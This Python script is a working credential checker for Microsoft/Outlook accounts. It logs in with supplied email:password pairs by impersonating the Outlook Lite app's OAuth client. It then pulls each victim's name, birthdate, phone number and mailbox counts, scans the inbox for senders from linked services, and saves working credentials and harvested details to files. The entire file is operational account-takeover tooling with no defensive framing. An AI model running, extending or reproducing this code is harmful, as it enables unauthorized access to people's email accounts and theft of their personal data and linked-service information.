import re
import uuid
import json
import time
import requests
from pathlib import Path
from typing import Optional, Dict, Any, List

CONFIG_FILE = Path("config.json")
OUTPUT_FILE = Path("valid_accounts.txt")
DETAILS_FILE = Path("account_details.json")


def load_config() -> Dict[str, Any]:
    if not CONFIG_FILE.exists():
        raise FileNotFoundError(f"Config file {CONFIG_FILE} not found")
    
    with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
        return json.load(f)


def get_flag(country: str) -> str:
    flags = {
        "US": "🇺🇸", "GB": "🇬🇧", "CA": "🇨🇦", "AU": "🇦🇺", "DE": "🇩🇪",
        "FR": "🇫🇷", "ES": "🇪🇸", "IT": "🇮🇹", "NL": "🇳🇱", "BR": "🇧🇷",
        "MX": "🇲🇽", "JP": "🇯🇵", "KR": "🇰🇷", "IN": "🇮🇳", "CN": "🇨🇳",
        "RU": "🇷🇺", "TR": "🇹🇷", "SA": "🇸🇦", "AE": "🇦🇪", "SG": "🇸🇬",
        "VN": "🇻🇳", "IL": "🇮🇱"
    }
    return flags.get(country, "🏳️")


def get_account_info(token: str, cid: str) -> Dict[str, Any]:
    headers = {
        "User-Agent": "Outlook-Android/2.0",
        "Pragma": "no-cache",
        "Accept": "application/json",
        "ForceSync": "false",
        "Authorization": f"Bearer {token}",
        "X-AnchorMailbox": f"CID:{cid}",
        "Host": "substrate.office.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip"
    }
    
    try:
        response = requests.get(
            "https://substrate.office.com/profileb2/v2.0/me/V1Profile",
            headers=headers,
            timeout=30
        )
        response.raise_for_status()
        data = response.json()
        
        name = data.get('names', [{}])[0].get('displayName', '')
        first_name = data.get('names', [{}])[0].get('givenName', '')
        last_name = data.get('names', [{}])[0].get('surname', '')
        country = data.get('accounts', [{}])[0].get('location', '')
        
        try:
            account = data["accounts"][0]
            birthdate = f"{account.get('birthYear', 0):04d}-{account.get('birthMonth', 0):02d}-{account.get('birthDay', 0):02d}"
            if birthdate == "0000-00-00":
                birthdate = ""
        except (KeyError, IndexError):
            birthdate = ""
        
        phone = data.get('accounts', [{}])[0].get('phoneNumber', '')
        email_verified = data.get('accounts', [{}])[0].get('verified', False)
        
        return {
            "name": name,
            "first_name": first_name,
            "last_name": last_name,
            "country": country,
            "flag": get_flag(country),
            "birthdate": birthdate,
            "phone": phone,
            "email_verified": email_verified
        }
    except Exception as e:
        return {"error": str(e)}


def get_full_account_details(token: str, cid: str, email: str) -> Dict[str, Any]:
    headers = {
        "Host": "outlook.live.com",
        "x-owa-sessionid": f"{cid}",
        "authorization": f"Bearer {token}",
        "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N) AppleWebKit/537.36",
        "action": "StartupData",
        "x-owa-correlationid": f"{cid}",
        "content-type": "application/json; charset=utf-8",
        "accept": "*/*",
        "origin": "https://outlook.live.com",
        "referer": "https://outlook.live.com/"
    }
    
    url = f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0"
    
    try:
        response = requests.post(url, headers=headers, data="", timeout=30)
        data = response.json()
        
        details = {}
        
        if "owaUserConfig" in data:
            config = data["owaUserConfig"]
            
            if "UserOptions" in config:
                opts = config["UserOptions"]
                details["timezone"] = opts.get("TimeZone", "")
                details["time_format"] = opts.get("TimeFormat", "")
                details["date_format"] = opts.get("DateFormat", "")
                details["dark_mode"] = opts.get("IsDarkModeTheme", False)
                details["focused_inbox"] = opts.get("IsFocusedInboxEnabled", False)
            
            if "SessionSettings" in config:
                sess = config["SessionSettings"]
                details["display_name"] = sess.get("UserDisplayName", "")
                details["user_principal_name"] = sess.get("UserPrincipalName", "")
                details["mailbox_guid"] = sess.get("MailboxGuid", "")
                details["user_language"] = config.get("UserLanguage", "")
                details["user_culture"] = config.get("UserCulture", "")
        
        if "findFolders" in data and "Body" in data["findFolders"]:
            body = data["findFolders"]["Body"]
            if "ResponseMessages" in body and "Items" in body["ResponseMessages"]:
                for msg in body["ResponseMessages"]["Items"]:
                    if "RootFolder" in msg and "Folders" in msg["RootFolder"]:
                        for folder in msg["RootFolder"]["Folders"]:
                            if folder.get("DistinguishedFolderId") == "inbox":
                                details["total_emails"] = folder.get("TotalCount", 0)
                                details["unread_emails"] = folder.get("UnreadCount", 0)
                            elif folder.get("DistinguishedFolderId") == "sentitems":
                                details["sent_emails"] = folder.get("TotalCount", 0)
                            elif folder.get("DistinguishedFolderId") == "deleteditems":
                                details["deleted_emails"] = folder.get("TotalCount", 0)
        
        details["mailbox_create_date"] = data.get("MailboxCreateDate", "")
        
        return details
        
    except Exception as e:
        return {"error": str(e)}


def check_inbox(token: str, cid: str, email: str, services: Dict) -> Dict[str, Any]:
    headers = {
        "Host": "outlook.live.com",
        "content-length": "0",
        "x-owa-sessionid": f"{cid}",
        "x-req-source": "Mini",
        "authorization": f"Bearer {token}",
        "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N) AppleWebKit/537.36",
        "action": "StartupData",
        "x-owa-correlationid": f"{cid}",
        "ms-cv": "YizxQK73vePSyVZZXVeNr+.3",
        "content-type": "application/json; charset=utf-8",
        "accept": "*/*",
        "origin": "https://outlook.live.com",
        "x-requested-with": "com.microsoft.outlooklite",
        "referer": "https://outlook.live.com/",
        "accept-language": "en-US,en;q=0.9"
    }
    
    url = f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0"
    
    try:
        response = requests.post(url, headers=headers, data="", timeout=30)
        response_text = response.text.lower()
        
        found_services = []
        for service_name, service_info in services.items():
            sender = service_info["sender"].lower()
            if sender in response_text:
                count = response_text.count(sender)
                found_services.append({
                    "service": service_name,
                    "category": service_info.get("category", "other"),
                    "matches": count
                })
        
        return {"services": found_services, "success": True}
    except Exception as e:
        return {"services": [], "success": False, "error": str(e)}


def login_account(email: str, password: str) -> Optional[tuple]:
    session = requests.Session()
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }
    session.headers.update(headers)
    
    try:
        url = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
        response = session.get(url, timeout=15)
        
        if "MSAccount" not in response.text:
            return None
        
        auth_url = (
            f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize"
            f"?client_info=1&haschrome=1&login_hint={email}&response_type=code"
            f"&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
            f"&scope=profile%20openid%20offline_access"
            f"&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
        )
        auth_response = session.get(auth_url, timeout=15)
        
        url_match = re.search(r'urlPost":"([^"]+)"', auth_response.text)
        ppft_match = re.search(r'name="PPFT" id="i0327" value="([^"]+)"', auth_response.text)
        
        if not url_match or not ppft_match:
            url_match = re.search(r'urlPost":"([^"]+)"', auth_response.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', auth_response.text)
        
        if not url_match or not ppft_match:
            return None
        
        post_url = url_match.group(1).replace("\\/", "/")
        ppft = ppft_match.group(1)
        
        login_data = {
            "login": email,
            "loginfmt": email,
            "passwd": password,
            "PPFT": ppft,
            "ps": 2,
            "PPSX": "PassportR",
            "NewUser": 1,
            "LoginOptions": 1,
        }
        
        login_response = session.post(post_url, data=login_data, allow_redirects=False, timeout=15)
        location = login_response.headers.get("Location", "")
        
        if "code=" not in location:
            if location:
                redirect_response = session.get(location, allow_redirects=True, timeout=15)
                if "code=" in redirect_response.url:
                    location = redirect_response.url
        
        code_match = re.search(r'code=([^&]+)', location)
        if not code_match:
            return None
        
        token_data = {
            "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
            "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
            "grant_type": "authorization_code",
            "code": code_match.group(1),
            "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
        }
        
        token_response = session.post(
            "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
            data=token_data,
            timeout=15
        )
        
        if token_response.status_code != 200:
            return None
        
        token_json = token_response.json()
        access_token = token_json.get("access_token")
        
        if not access_token:
            return None
        
        mspcid = next((c.value for c in session.cookies if c.name == "MSPCID"), None)
        cid = mspcid.upper() if mspcid else str(uuid.uuid4()).upper()
        
        return (access_token, cid)
        
    except Exception:
        return None


def save_results(email: str, password: str, profile: Dict, details: Dict, inbox: Dict):
    with open(OUTPUT_FILE, 'a', encoding='utf-8') as f:
        f.write(f"{email}:{password}\n")
    
    results = []
    if DETAILS_FILE.exists():
        with open(DETAILS_FILE, 'r', encoding='utf-8') as f:
            results = json.load(f)
    
    results.append({
        "email": email,
        "password": password,
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "profile": profile,
        "mailbox_details": details,
        "linked_services": inbox
    })
    
    with open(DETAILS_FILE, 'w', encoding='utf-8') as f:
        json.dump(results, f, indent=2, ensure_ascii=False)


def check_account(email: str, password: str, services: Dict) -> Dict[str, Any]:
    result = login_account(email, password)
    
    if not result:
        return {
            "success": False,
            "email": email,
            "error": "Invalid credentials or login failed"
        }
    
    token, cid = result
    
    profile_info = get_account_info(token, cid)
    full_details = get_full_account_details(token, cid, email)
    inbox_info = check_inbox(token, cid, email, services)
    
    save_results(email, password, profile_info, full_details, inbox_info)
    
    return {
        "success": True,
        "email": email,
        "password": password,
        "profile": profile_info,
        "mailbox": full_details,
        "linked_services": inbox_info
    }


def main():
    config = load_config()
    services = config.get("services", {})
    
    entry = input("Enter email:password: ").strip()
    
    if ':' not in entry:
        print("Invalid format. Use email:password")
        return
    
    email, password = entry.split(':', 1)
    result = check_account(email.strip(), password.strip(), services)
    print(json.dumps(result, indent=2, ensure_ascii=False))


if __name__ == "__main__":
    main()
